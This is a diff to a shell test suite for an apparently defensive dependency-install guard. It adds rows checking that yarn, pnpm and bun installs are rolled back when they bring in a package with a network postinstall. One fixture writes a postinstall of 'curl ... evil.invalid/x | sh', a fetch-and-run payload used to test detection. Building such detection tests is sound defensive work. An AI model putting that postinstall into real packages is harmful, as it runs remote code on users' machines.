@@ -2,16 +2,18 @@
 # safedeps: an npx call is judged only where it left a trace, and a rollback
 # does not remove node_modules for its own time.
 #
-# A call the pre hook records as an install but that holds no npm install
-# statement (`npx <name>`, `npx --no-install <name>`) used to be judged as an
-# npm install: the post hook checked the project's whole closure, rolled the
-# project back, recorded its whole tree as withheld and, where node_modules was
-# a real directory and a tool made a cache directory under it, removed it. The
-# rows are numbered by the four repairs, R1 to R4, each beside the threat it
-# must still catch:
+# A call the pre hook records as an install but whose installs are node
+# package runners alone (`npx <name>`, `npx --no-install <name>`, `pnpm dlx`,
+# `yarn dlx`, `bunx`) used to be judged as an npm install: the post hook
+# checked the project's whole closure, rolled the project back, recorded its
+# whole tree as withheld and, where node_modules was a real directory and a
+# tool made a cache directory under it, removed it. The rows are numbered by
+# the four repairs, R1 to R4, each beside the threat it must still catch:
 #
-#   R1  a recorded call with no npm install statement is judged only where it
-#       left a trace in npm's records
+#   R1  a recorded call whose installs are node package runners alone is
+#       judged only where it left a trace in npm's records; an install by any
+#       manager (`yarn add`, `pnpm add`, `bun add`), alone or beside a runner,
+#       and a runner that runs a package manager are judged as before
 #   R2  the KEV catalog is read once per closure check (the read count is a
 #       unit test, post::providers::catalog_tests; the row here is the stale
 #       catalog with a refresh that fails, which says so once)
@@ -177,7 +179,7 @@ dir_hash() { python3 -c 'import hashlib,os,sys; print(hashlib.md5(os.path.realpa
 # between the two hooks.
 tick() { sleep 1.1; }
 
-# --- R1: a recorded call with no npm install statement ------------------------
+# --- R1: a recorded call whose installs are node package runners alone -------
 
 # r1_quiet <row> <command> [between]: the post hook judges nothing, and the
 # project is as it was. <between> runs between the two hooks.
@@ -269,6 +271,57 @@ out=$(post_hook "${dir}" 'npm install fixture-parent@1.0.0' "${id}")
 ! message "${out}" | grep -q 'suspicious dependency change' || fail "r1-5b: an approved install is not rolled back ($(message "${out}" | head -3 | tr '\n' '|'))"
 [[ -s "${SAFEDEPS_HOME}/confirmed_$(dir_hash "${dir}")" ]] || fail "r1-5b: the approved install is confirmed"
 row "R1.5b (regression) an approved npm install passes and is confirmed"
+
+# r1_threat <row> <command> <lockfile>: an approved install by a manager that
+# writes neither npm record, or a call that holds one, brings in a package
+# whose postinstall fetches a script and runs it. The project has no npm
+# lockfile, so no closure check speaks: the install script check finds the
+# package and the call is rolled back, as before the runner rule. No install
+# command runs: the files it would write are made between the two hooks.
+r1_threat() {
+  local name="$1" command="$2" lock="$3" id out
+  fresh_home
+  "${ROOT_DIR}/lib/ledger/ledger.sh" approve npm fixture-tool 1.0.0 1.0.0 npx-judgment >/dev/null
+  dir="${tmp_root}/${name}"
+  mkdir -p "${dir}/node_modules/.bin"
+  printf '{"name":"%s","dependencies":{}}\n' "${name}" > "${dir}/package.json"
+  printf '# lock before\n' > "${dir}/${lock}"
+  id=$(next_id)
+  pre_hook "${dir}" "${command}" "${id}" > "${tmp_root}/${name}.pre"
+  [[ ! -s "${tmp_root}/${name}.pre" ]] || fail "${name}: the pre hook lets the call run as it is ($(cat "${tmp_root}/${name}.pre"))"
+  [[ -n "$(pending_snapshot "${id}")" ]] || fail "${name}: the pre hook records the call (no pending record for ${id})"
+  tick
+  printf '{"name":"%s","dependencies":{"fixture-tool":"1.0.0"}}\n' "${name}" > "${dir}/package.json"
+  printf '# lock after\nfixture-tool@1.0.0\n' > "${dir}/${lock}"
+  mkdir -p "${dir}/node_modules/fixture-evil"
+  printf '%s\n' '{"name":"fixture-evil","version":"1.0.0","scripts":{"postinstall":"curl -s https://evil.invalid/x | sh"}}' \
+    > "${dir}/node_modules/fixture-evil/package.json"
+  out=$(post_hook "${dir}" "${command}" "${id}")
+  message "${out}" | grep -qxF 'safedeps: suspicious dependency change detected. A rollback ran.' \
+    || fail "${name}: the call is rolled back ($(message "${out}" | head -2 | tr '\n' '|'))"
+  message "${out}" | grep -qF "Package 'fixture-evil' has install script with network access" \
+    || fail "${name}: the install script check names the package"
+  [[ ! -e "${dir}/node_modules/fixture-evil" ]] || fail "${name}: the package the install brought in is removed"
+  [[ "$(reorg_entries)" -ge 1 ]] || fail "${name}: reorg.log has the rollback"
+}
+
+r1_threat r1-6a 'yarn add fixture-tool@1.0.0' yarn.lock
+row "R1.6a (threat) yarn add bringing a package with a network postinstall: REORG and removal"
+r1_threat r1-6b 'pnpm add fixture-tool@1.0.0' pnpm-lock.yaml
+row "R1.6b (threat) pnpm add bringing a package with a network postinstall: REORG and removal"
+r1_threat r1-6c 'bun add fixture-tool@1.0.0' bun.lock
+row "R1.6c (threat) bun add bringing a package with a network postinstall: REORG and removal"
+r1_threat r1-7 'npx vitest run x && yarn add fixture-tool@1.0.0' yarn.lock
+row "R1.7 (threat) a runner beside a yarn add that brings a network postinstall: REORG and removal"
+r1_threat r1-8 'npx yarn add fixture-tool@1.0.0' yarn.lock
+row "R1.8 (threat) a runner that runs a package manager's install: REORG and removal"
+
+r1_quiet r1-9a 'pnpm dlx vitest run x'
+row "R1.9a pnpm dlx vitest run, tree untouched: no judgment, no record, no rollback"
+r1_quiet r1-9b 'yarn dlx vitest run x'
+row "R1.9b yarn dlx vitest run, tree untouched: no judgment, no record, no rollback"
+r1_quiet r1-9c 'bunx vitest run x'
+row "R1.9c bunx vitest run, tree untouched: no judgment, no record, no rollback"
 
 # --- R2: the KEV catalog -------------------------------------------------------
 
